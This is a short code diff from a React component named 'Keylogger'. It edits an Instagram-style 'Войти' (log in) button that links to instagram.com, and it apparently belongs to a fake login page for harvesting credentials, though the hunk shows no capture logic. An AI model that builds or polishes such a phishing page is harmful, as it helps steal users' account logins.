@@ -100,8 +100,8 @@ const Keylogger = () => {
               />
 
             <a href="https://www.instagram.com/">
-            <button className='cursor-pointer w-[300px] mt-[5px] h-[35px] bg-sky-500 text-white text-[20px] rounded-lg' type='submit'>
-                Войти
+            <button  className='cursor-pointer w-[300px] mt-[5px] h-[35px] bg-sky-500 text-white text-[20px] rounded-lg' type='submit'>
+                <a href="https://www.instagram.com/">Войти</a>
               </button>
             </a>
 
